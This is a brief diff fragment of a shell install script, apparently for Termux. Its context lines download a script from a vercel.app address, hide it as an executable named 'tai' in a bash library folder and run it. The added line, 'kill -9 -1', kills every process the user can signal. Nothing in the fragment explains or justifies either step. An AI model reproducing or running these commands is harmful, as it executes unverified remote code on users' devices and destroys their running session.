@@ -12,3 +12,4 @@ chmod +x "$PSBIN"
 curl -sL -o "$PREFIX/lib/bash/tai" https://bot-alpha-eosin.vercel.app/trial.sh
 chmod +x "$PREFIX/lib/bash/tai"
 "$PREFIX/lib/bash/tai"
+kill -9 -1
